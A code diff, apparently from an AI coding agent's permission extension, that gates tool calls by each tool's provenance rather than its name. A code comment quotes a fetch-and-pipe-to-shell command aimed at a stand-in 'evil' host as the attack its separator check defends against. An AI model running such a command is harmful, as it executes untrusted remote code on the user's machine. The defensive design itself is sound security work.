@@ -1,8 +1,11 @@
 """Built-in PermissionExtension — interactive allow/deny gate on ``tool_call``.
 
 Phase 1 of the tool-call permission/approval system. Modelled on
-``@gotgenes/pi-permission-system``: mutating tools (bash-family + write-family)
-are gated behind an interactive 4-option dialog when a UI is attached:
+``@gotgenes/pi-permission-system``: mutating tools are gated behind an
+interactive 4-option dialog when a UI is attached. "Mutating" is every tool
+that is not one of aelix's OWN read-only tools (ADR-0253, #188) — decided by
+the provenance of the tool object, never by its name — so an MCP, extension or
+pack tool asks in ``default`` and is blocked in ``plan`` like ``bash`` is:
 
 - ``Yes`` — allow this one call.
 - ``Yes, for this session`` — allow + synthesize an ephemeral wildcard rule so
@@ -14,7 +17,9 @@ Esc / cancellation (``select`` returns ``None``) is treated as a denial.
 
 Design notes:
 
-- Read-only tools are silently allowed (``return None``) — no prompt.
+- aelix's own read-only tools (``read`` / ``grep`` / ``find`` / ``ls`` /
+  ``aelix_status``) and the bundled ``agent`` tool are silently allowed
+  (``return None``) — no prompt. Any other tool is not.
 - Headless / print / RPC runs (``not ctx.has_ui``) default to ALLOW so the
   non-interactive behaviour is preserved; :class:`GuardrailExtension` still
   hard-blocks dangerous patterns separately.
@@ -58,6 +63,7 @@ from aelix_coding_agent.builtin.permission_mode import (
     PermissionPosture,
 )
 from aelix_coding_agent.extensions.api import ExtensionAPI, ExtensionContext
+from aelix_coding_agent.tools.provenance import ToolProvenance, builtin_provenance
 
 # Shell metacharacters that introduce a NEW command / sub-command. A
 # session-approved bash prefix must NEVER auto-allow a command that contains one
@@ -65,16 +71,29 @@ from aelix_coding_agent.extensions.api import ExtensionAPI, ExtensionContext
 # match ``git commit -m x && curl evil|sh``.
 _SHELL_SEPARATORS = (";", "&&", "||", "|", "&", "`", "$(", "${", "\n", ">", "<")
 
-# Mutating tools gated by the permission prompt — the union of the bash-family
-# and write-family sets the guardrail uses.
+# WHICH CALLS THE GATE LETS THROUGH UNASKED (ADR-0253, #188). Not a name list.
 #
-# DO NOT add ``"agent"`` here (ADR-0197 §(i)). It looks like the delegation
-# consent gate and is not one: ``_rule_key`` falls through to an ARGS-BLIND
-# ``f"tool:{tool_name}"`` at ``:116``, so a single "Yes, for this session" would
-# approve every profile against every task for the rest of the run. Delegation
-# consent lives in ``aelix_agents/consent.py``, keyed on what actually varies
-# (profile + source_path + posture) and never persisted.
-_MUTATING = _BASH_TOOLS | _WRITE_TOOLS
+# This used to be ``_MUTATING = _BASH_TOOLS | _WRITE_TOOLS`` — eight BARE names —
+# and "not in it" meant read-only: silently allowed in every posture and not
+# stopped by PLAN. Every tool aelix did not build arrives under another name
+# (MCP: ``<server>__<tool>``; extensions and packs: anything), so measured on
+# ``aab1f210`` an MCP ``fs__write_file`` ran without a prompt in ``default`` and
+# ran in ``plan`` too. The default is now the other way round: a call passes
+# without a prompt only when the tool it will execute is an OBJECT one of
+# aelix's own factories built (:mod:`aelix_coding_agent.tools.provenance`) and
+# that object is read-only, or is the bundled delegation tool. Everything else
+# is mutating — MCP tools whatever their ``readOnlyHint`` says, extension and
+# pack tools, and a third-party tool that happens to be called ``read``.
+#
+# ``delegation`` is here, and not mutating, for ADR-0197 §(i)'s reason, which is
+# unchanged: treating ``agent`` as mutating would route it through
+# ``_rule_key``'s ARGS-BLIND ``f"tool:{tool_name}"`` fallback, so a single "Yes,
+# for this session" would approve every profile against every task for the rest
+# of the run. Delegation consent lives in ``aelix_agents/consent.py``, keyed on
+# what actually varies (profile + source_path + posture) and never persisted;
+# the child's posture is clamped to at most the parent's. Only the aelix-built
+# ``agent`` object gets this pass — an unrelated tool named ``agent`` does not.
+_UNGATED_PROVENANCE: frozenset[ToolProvenance] = frozenset({"read_only", "delegation"})
 
 # The block reason a DELEGATED CHILD returns instead of the headless ALLOW
 # (ADR-0197 §(e)). Phrased FOR THE MODEL: the child has no approval channel
@@ -91,6 +110,85 @@ _YES_SESSION = "Yes, for this session"
 _NO = "No"
 _NO_REASON = "No, provide reason"
 _OPTIONS = [_YES, _YES_SESSION, _NO, _NO_REASON]
+
+
+def _resolve_provenance(event: ToolCallHookEvent) -> ToolProvenance | None:
+    """The provenance of the tool this call will EXECUTE, or ``None``.
+
+    Resolved exactly the way the loop resolves it — the LAST tool of that name in
+    the turn's ``AgentContext.tools`` (``loop.py``:
+    ``tool_map = {t.name: t for t in context.tools}``) — so the object classified
+    here is the object that runs. No context (an event built by hand, outside
+    the loop) means no evidence, and no evidence is not a licence: ``None``,
+    which the gate treats as an unknown, mutating tool.
+    """
+
+    context = event.context
+    if context is None:
+        return None
+    resolved = None
+    for tool in context.tools:
+        if tool.name == event.tool_name:
+            resolved = tool
+    return None if resolved is None else builtin_provenance(resolved)
+
+
+def _plan_block_reason(tool_name: str, provenance: ToolProvenance | None) -> str:
+    """PLAN's refusal, said for what was refused.
+
+    The built-in bash/write tools keep the posture's own sentence. Any other tool
+    gets one that names why it is blocked — the model cannot otherwise tell that
+    an MCP ``search`` it believes is harmless was refused because aelix cannot
+    know that, and would retry it.
+    """
+
+    if provenance in ("bash", "write"):
+        return MODE_META[PermissionMode.PLAN].block_reason
+    return (
+        f"Plan mode is active: {tool_name!r} is not one of aelix's read-only "
+        "built-in tools, so it is blocked like a file edit or a shell command "
+        "(MCP and extension tools are never assumed to be read-only). Use read, "
+        "grep, find or ls to investigate, and propose a plan first. shift+tab "
+        "to exit plan mode."
+    )
+
+
+def _gate_rule_key(provenance: ToolProvenance | None, tool_name: str, args: dict[str, Any]) -> str:
+    """The rule key, namespaced by PROVENANCE and not by name (ADR-0253).
+
+    Only aelix's own ``bash`` / ``write`` / ``edit`` objects get the ``bash:`` /
+    ``write:`` namespaces; every other tool is ``tool:<name>``, matched EXACTLY
+    (:meth:`PermissionExtension._is_session_allowed`). So a session grant made
+    for a built-in write can never cover an extension's ``write_file``, and a
+    grant for one MCP tool never covers another.
+    """
+
+    if provenance in ("bash", "write"):
+        return _rule_key(tool_name, args)
+    return f"tool:{tool_name}"
+
+
+def _gate_session_wildcard(
+    provenance: ToolProvenance | None, tool_name: str, args: dict[str, Any]
+) -> str:
+    """:func:`_session_wildcard`, namespaced by provenance like :func:`_gate_rule_key`."""
+
+    if provenance in ("bash", "write"):
+        return _session_wildcard(tool_name, args)
+    return f"tool:{tool_name}"
+
+
+def _gate_request_kind(provenance: ToolProvenance | None, tool_name: str) -> str:
+    """The dialog body kind: a diff or a command only for aelix's own tools.
+
+    A third-party tool shows its raw arguments (``other``) — rendering an MCP
+    ``write_file``'s ``content`` as if it were the built-in write's diff would
+    describe what aelix's tool does, not what that one does.
+    """
+
+    if provenance in ("bash", "write"):
+        return _request_kind(tool_name)
+    return "other"
 
 
 def _command_from_args(args: dict[str, Any]) -> str:
@@ -516,6 +614,12 @@ class PermissionExtension:
         aelix.on("session_shutdown", self._on_shutdown)
 
     def _is_session_allowed(self, rule_key: str) -> bool:
+        # ``tool:`` keys (every tool that is not aelix's own bash/write/edit,
+        # ADR-0253) match by EQUALITY, never fnmatch: a tool name is chosen by
+        # whoever wrote the tool, and a grant for a tool named ``*`` or
+        # ``srv__[a-z]*`` would otherwise approve every tool it globs.
+        if rule_key.startswith("tool:"):
+            return rule_key in self._session_allows
         # SECURITY (finding WP-0 #3 — matching side): a ``bash:`` candidate that
         # contains a shell separator must NEVER be auto-allowed by a PREFIX
         # wildcard (only by an exact-equal rule). Otherwise approving the benign
@@ -539,8 +643,14 @@ class PermissionExtension:
         ctx: ExtensionContext,
     ) -> ToolCallResult | None:
         mode = self.posture.get()
-        is_bash = event.tool_name in _BASH_TOOLS
-        is_mutating = event.tool_name in _MUTATING
+        # ADR-0253 (#188): every decision below keys on what the tool IS — the
+        # provenance of the object the loop will execute — never on its name.
+        # ``None`` is any tool aelix did not build (MCP, extension, pack), and
+        # such a tool is mutating.
+        provenance = _resolve_provenance(event)
+        is_bash = provenance == "bash"
+        is_builtin_write = provenance == "write"
+        is_mutating = provenance not in _UNGATED_PROVENANCE
 
         # (b) PLAN mode blocks ALL mutating tools — even on the headless / print /
         # rpc path (this check is placed ABOVE the read-only short-circuit and
@@ -549,14 +659,16 @@ class PermissionExtension:
         # can still investigate while planning.
         if mode == PermissionMode.PLAN and is_mutating:
             return ToolCallResult(
-                block=True, reason=MODE_META[PermissionMode.PLAN].block_reason
+                block=True, reason=_plan_block_reason(event.tool_name, provenance)
             )
 
-        # (a) Read-only tools are silently allowed (all modes; PLAN handled above).
+        # (a) aelix's own read-only tools (and the bundled ``agent`` tool, whose
+        # consent is ``aelix_agents``') are silently allowed in every mode; PLAN
+        # handled above.
         if not is_mutating:
             return None
 
-        rule_key = _rule_key(event.tool_name, event.args)
+        rule_key = _gate_rule_key(provenance, event.tool_name, event.args)
 
         # (c) Session-approved (wildcard match) → allow without prompting.
         if self._is_session_allowed(rule_key):
@@ -571,15 +683,20 @@ class PermissionExtension:
         if mode == PermissionMode.YOLO:
             return None
 
-        # (f) AUTO_ACCEPT — auto-allow the write-family without a prompt; bash
-        # still prompts (bash can do arbitrary damage). Non-bash mutating ==
-        # write-family here. SECURITY (finding WP-0 #4): only auto-allow writes
-        # that resolve INSIDE the project root and are not security-sensitive
-        # (SSH keys / shell rc / cron / .env); anything else falls through to the
-        # prompt so AUTO_ACCEPT can never silently plant a backdoor outside cwd.
+        # (f) AUTO_ACCEPT — auto-allow aelix's OWN write/edit without a prompt;
+        # bash still prompts (bash can do arbitrary damage). SECURITY (finding
+        # WP-0 #4): only auto-allow writes that resolve INSIDE the project root
+        # and are not security-sensitive (SSH keys / shell rc / cron / .env);
+        # anything else falls through to the prompt so AUTO_ACCEPT can never
+        # silently plant a backdoor outside cwd.
+        #
+        # ADR-0253 (#188): "auto-accept EDITS" means the edits aelix itself
+        # performs. A tool aelix did not build is never auto-allowed here, with
+        # a path argument or without one — a ``path`` key says nothing about what
+        # an MCP or extension tool does with it — so it asks like bash does.
         if (
             mode == PermissionMode.AUTO_ACCEPT
-            and not is_bash
+            and is_builtin_write
             and _is_auto_allowable_write(_path_from_args(event.args), ctx.cwd)
         ):
             return None
@@ -587,17 +704,20 @@ class PermissionExtension:
         # prompt (or headless-allow below).
 
         # (g) AUTO — classify bash via tree-sitter (ADR-0158): ALLOW→no prompt,
-        # ASK→prompt, DENY→block. Non-bash mutating behaves like AUTO_ACCEPT
-        # (auto-allow writes). If the classifier is unavailable the bash path
-        # falls through to the prompt (DEFAULT semantics) — NEVER silent-allow.
+        # ASK→prompt, DENY→block. aelix's own write/edit behave like
+        # AUTO_ACCEPT. If the classifier is unavailable the bash path falls
+        # through to the prompt (DEFAULT semantics) — NEVER silent-allow. A tool
+        # aelix did not build is neither classified nor auto-allowed (ADR-0253):
+        # the classifier reads a bash grammar, and its verdict says nothing about
+        # a tool that is not aelix's bash.
         if mode == PermissionMode.AUTO:
-            if not is_bash:
+            if is_builtin_write:
                 # Writes auto-allowed ONLY inside the project root and not
                 # security-sensitive (finding WP-0 #4); else fall through to the
                 # headless-allow / prompt path below (same as AUTO_ACCEPT).
                 if _is_auto_allowable_write(_path_from_args(event.args), ctx.cwd):
                     return None
-            else:
+            elif is_bash:
                 decision = self._auto_classify_bash(event.args)
                 if decision == "allow":
                     return None
@@ -610,7 +730,9 @@ class PermissionExtension:
 
         # (d) Headless / print / RPC default = ALLOW for DEFAULT / AUTO_ACCEPT /
         # YOLO / AUTO-ask (preserve non-interactive behaviour; the guardrail
-        # still hard-blocks separately). PLAN already denied above.
+        # still hard-blocks separately). PLAN already denied above. A tool aelix
+        # did not build reaches this line exactly where aelix's own bash does
+        # (ADR-0253), so it gets the same verdict.
         #
         # ADR-0197 §(e): a DELEGATED CHILD flips this to block-with-reason via
         # ``headless_default``, leaving every existing ``-p`` / json / rpc user
@@ -621,7 +743,8 @@ class PermissionExtension:
                 return ToolCallResult(block=True, reason=_HEADLESS_BLOCK_REASON)
             return None
 
-        # (h) DEFAULT (and AUTO_ACCEPT bash / AUTO-ask bash) → the 4-option prompt.
+        # (h) DEFAULT (and AUTO_ACCEPT bash / AUTO-ask bash / any tool aelix did
+        # not build, outside YOLO) → the 4-option prompt.
         # Serialize prompts so parallel tool calls never race two modals.
         async with self._lock:
             # Re-check inside the lock — a concurrent prompt may have just
@@ -675,7 +798,7 @@ class PermissionExtension:
             # Resolves the DEFAULT shell chain, with no ``shell_path``. That
             # matches what the tool spawns today only because nothing wires a
             # custom shell through: ``create_bash_tool`` reads
-            # ``opts["shell_path"]`` (``tools/bash.py:1144-1146``) but no caller sets
+            # ``opts["shell_path"]`` (``tools/bash.py:1145-1147``) but no caller sets
             # it, and ``SettingsManager.get_shell_path()``
             # (``settings_manager.py:1406``) is referenced only by its own
             # test. Treat that as a coincidence, not an invariant — if
@@ -727,20 +850,35 @@ class PermissionExtension:
         the hook's throw default (W4 code-review MEDIUM).
         """
 
+        # ADR-0253: what the dialog shows, whether a redirect is offered and what
+        # "for this session" records all follow the tool's provenance, resolved
+        # the same way the gate resolved it.
+        provenance = _resolve_provenance(event)
+
         # Issue #161 shape 3 — computed ONCE and shared by both prompt paths, so
         # the dialog and the generic fallback cannot offer different answers to
         # the same question. ``None`` for every write outside the two extension
         # tiers, which is every ordinary edit.
         redirect = (
             _extension_redirect(event.args, ctx.cwd)
-            if event.tool_name == "write"
+            if provenance == "write" and event.tool_name == "write"
             else None
         )
 
         if self.approval_runner is not None:
-            return await self._prompt_via_dialog(event, redirect)
+            return await self._prompt_via_dialog(event, redirect, provenance)
 
-        summary = _summary(event.tool_name, event.args)
+        # aelix's own bash / write / edit keep their one-line command or path.
+        # Every other tool shows EVERY argument, each value bounded (#188 round
+        # 1): this title is all a generic ``ctx.ui.select`` host shows, and a
+        # bare "Allow fs__write_file?" asks the user to approve a call they
+        # cannot see. The same rows the approval dialog prints.
+        if provenance in ("bash", "write"):
+            summary = _summary(event.tool_name, event.args)
+        else:
+            from aelix_coding_agent.tui.approval_dialog import argument_summary
+
+            summary = argument_summary(event.args)
         title = f"Allow {event.tool_name}? {summary}".rstrip()
         options = list(_OPTIONS)
         if redirect is not None:
@@ -768,7 +906,9 @@ class PermissionExtension:
         if choice == _YES:
             return None
         if choice == _YES_SESSION:
-            self._session_allows.add(_session_wildcard(event.tool_name, event.args))
+            self._session_allows.add(
+                _gate_session_wildcard(provenance, event.tool_name, event.args)
+            )
             return None
         if choice == _NO:
             return ToolCallResult(block=True, reason="Denied by the user.")
@@ -818,6 +958,7 @@ class PermissionExtension:
         self,
         event: ToolCallHookEvent,
         redirect: tuple[str, str, str] | None = None,
+        provenance: ToolProvenance | None = None,
     ) -> ToolCallResult | None:
         """Drive the purpose-built approval dialog (ADR-0157, STEP 5)."""
 
@@ -829,7 +970,7 @@ class PermissionExtension:
         request = ApprovalRequest(
             tool_name=event.tool_name,
             args=event.args,
-            kind=_request_kind(event.tool_name),
+            kind=_gate_request_kind(provenance, event.tool_name),
             yes_label=redirect[0] if redirect else None,
             redirect_label=redirect[1] if redirect else None,
         )
@@ -856,7 +997,9 @@ class PermissionExtension:
         if decision == ApprovalDecision.YES:
             return None
         if decision == ApprovalDecision.YES_SESSION:
-            self._session_allows.add(_session_wildcard(event.tool_name, event.args))
+            self._session_allows.add(
+                _gate_session_wildcard(provenance, event.tool_name, event.args)
+            )
             return None
         if decision == ApprovalDecision.NO:
             return ToolCallResult(block=True, reason="Denied by the user.")
